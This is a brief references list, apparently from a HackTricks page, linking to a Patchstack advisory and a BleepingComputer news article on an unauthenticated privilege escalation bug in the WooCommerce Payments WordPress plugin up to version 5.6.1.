- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)

{{#include ../../banners/hacktricks-training.md}}
